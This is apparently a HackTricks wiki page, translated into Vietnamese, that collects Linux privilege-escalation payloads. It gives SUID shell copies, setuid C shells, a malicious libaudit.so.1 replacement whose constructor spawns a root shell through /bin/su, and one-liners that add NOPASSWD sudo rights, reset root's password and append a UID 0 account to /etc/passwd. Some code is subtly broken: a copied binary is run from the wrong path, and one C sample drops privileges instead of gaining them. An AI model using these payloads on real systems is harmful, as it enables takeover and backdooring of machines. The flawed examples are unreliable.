# Payloads to execute

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` bật chế độ đặc quyền: khi Bash khởi chạy với real ID và effective ID khác nhau, nó không đặt lại effective ID thành real ID. Shell tạo ra vẫn phụ thuộc vào thông tin xác thực hiện có của caller.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```

## C

`setresuid` thay đổi real, effective và saved ID khi được phép, trong khi `setuid` thay đổi effective ID và cũng có thể đặt real và saved ID cho tiến trình gọi có đặc quyền. `execve` thay thế ảnh tiến trình hiện tại bằng chương trình được yêu cầu.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Các ví dụ này bỏ qua việc kiểm tra giá trị trả về; cả hai lời gọi thay đổi thông tin xác thực đều có thể thất bại ngay cả với UID 0.<sup>[[2]](#references)[[3]](#references)</sup>

```c
//gcc payload.c -o payload
int main(void){
    setresuid(0, 0, 0); //Set as user suid user
    system("/bin/sh");
    return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 1000;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

## Ghi đè tệp để leo thang đặc quyền

### Các tệp phổ biến

Đây là những tệp và giao diện phổ biến dùng để kiểm soát đặc quyền cục bộ: `/etc/passwd` lưu các bản ghi tài khoản gồm bảy trường, `/etc/shadow` lưu dữ liệu mật khẩu đã mã hóa nếu có, `sudoers` xác định đặc quyền sudo và các tag như `NOPASSWD`, còn endpoint daemon mặc định của Docker là Unix socket tại `/var/run/docker.sock`; quyền truy cập socket này có thể cấp quyền kiểm soát host ở cấp root.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Thêm người dùng kèm mật khẩu vào _/etc/passwd_
- Đổi mật khẩu trong _/etc/shadow_
- Thêm người dùng vào sudoers trong _/etc/sudoers_
- Lạm dụng Docker thông qua Docker socket, thường nằm ở _/run/docker.sock_ hoặc _/var/run/docker.sock_

### Ghi đè thư viện

Kiểm tra các thư viện dùng chung mà một binary sử dụng; trong ví dụ này, kiểm tra `/bin/su` bằng `ldd`.<sup>[[9]](#references)</sup>

```bash
ldd /bin/su
        linux-vdso.so.1 (0x00007ffef06e9000)
        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
        libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
        libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
        libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```

`ldd` báo cáo các dependency của shared object, trong khi dynamic linker sử dụng metadata ELF và các quy tắc tìm kiếm để tải chúng khi chạy.<sup>[[9]](#references)[[10]](#references)</sup>

Để kiểm tra một ứng viên, dùng `objdump -T` để in bảng symbol động của `su` và lọc các tên audit.<sup>[[11]](#references)</sup>

```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```

`audit_open`, `audit_log_user_message` và `audit_log_acct_message` là các hàm của libaudit; `audit_fd` được hiển thị là một đối tượng dữ liệu được định nghĩa trong `.bss` của `su` ở đầu ra này.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Thư viện thay thế phải export các định nghĩa tương thích cho những symbol chưa được định nghĩa mà bộ nạp phân giải; ABI của hàm/dữ liệu không khớp vẫn có thể khiến tiến trình thất bại khi các symbol đó được relocate hoặc gọi.<sup>[[10]](#references)[[11]](#references)</sup>

Thuộc tính `constructor` của GCC khiến `inject` được gọi tự động trước `main` trên các target được hỗ trợ.<sup>[[15]](#references)</sup>

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Nếu replacement được một process **`/bin/su`** có đặc quyền nạp thành công, constructor này có thể khởi chạy **`/bin/bash`** với các đặc quyền của process đó; kết quả chính xác phụ thuộc vào môi trường.<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

Bạn có thể khiến root thực thi thứ gì đó không?

`sudoers` sử dụng tag `NOPASSWD` trong các mục policy, `chpasswd` đọc các cặp `user:password` từ đầu vào chuẩn, còn `/etc/passwd` sử dụng bảy trường tài khoản được phân tách bằng dấu hai chấm; các ví dụ sau giả định rằng process chạy chúng có thể ghi vào những file liên quan.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data to sudoers**

```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

### **Đổi mật khẩu root**

```bash
echo "root:hacked" | chpasswd
```

### Thêm người dùng root mới vào /etc/passwd

Payload cuối cùng phụ thuộc vào việc target có chấp nhận crypt hash được tạo hay không: `mkpasswd -m sha-512` của Debian ánh xạ sang SHA-512 crypt (`$6$`), trong khi `passwd -1 -salt` của OpenSSL sử dụng thuật toán BSD dựa trên MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>

```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```

## References

- [1] [Lệnh dựng sẵn Set (Tài liệu tham khảo Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Trang hướng dẫn Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Bảo vệ socket của Docker daemon](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Tài liệu Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (Các tiện ích nhị phân GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Trang hướng dẫn Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Trang hướng dẫn Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Trang hướng dẫn Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Các thuộc tính chung (Sử dụng GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Mã nguồn Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — Tài liệu OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
